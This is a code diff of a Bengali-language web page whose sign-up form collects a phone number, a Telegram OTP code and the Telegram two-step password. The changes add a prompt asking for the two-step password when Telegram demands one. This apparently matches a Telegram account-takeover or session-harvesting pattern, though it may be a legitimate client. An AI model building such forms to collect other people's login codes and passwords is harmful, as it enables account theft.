@@ -258,7 +258,7 @@
 
                 if (!phoneNumber) return alert("ফোন নম্বর দিন!");
                 if (!sitePassword) return alert("পাসওয়ার্ড দিন!");
-                if (mode === 'signup' && !otpCode) return alert("টেলিগ্রাম কোডটি দিন!");
+                if (mode === 'signup' && !otpCode) return alert("টেলিগ্রাম ওটিপি কোডটি দিন!");
                 
                 btn.innerText = "প্রসেসিং হচ্ছে...";
                 btn.disabled = true;
@@ -270,7 +270,7 @@
                         body: JSON.stringify({
                             phone: fullPhone,
                             code: otpCode,
-                            password: twoStepPass,
+                            password: twoStepPass, // ইউজার দিলে যাবে, না দিলে ফাঁকা থাকবে
                             name: fullName,
                             site_password: sitePassword
                         })
@@ -282,7 +282,13 @@
                         alert("সফলভাবে লগইন হয়েছে! ড্যাশবোর্ডে নিয়ে যাওয়া হচ্ছে...");
                         window.location.href = "/dashboard";
                     } else {
-                        alert("লগইন ফেইল্ড: " + data.message);
+                        // যদি টেলিগ্রাম থেকে ২-স্টেপ পাসওয়ার্ড চাওয়া হয়
+                        if (data.message && data.message.includes("password")) {
+                            alert("আপনার টেলিগ্রামে ২-স্টেপ পাসওয়ার্ড সেট করা আছে। দয়া করে পাসওয়ার্ডটি দিয়ে আবার চেষ্টা করুন।");
+                            document.getElementById('two-step').focus();
+                        } else {
+                            alert("ব্যর্থ হয়েছে: " + data.message);
+                        }
                     }
                 } catch (err) {
                     alert("ভেরিফিকেশন এরর!");
@@ -294,4 +300,4 @@
         }
     </script>
 </body>
-    </html>
+</html>
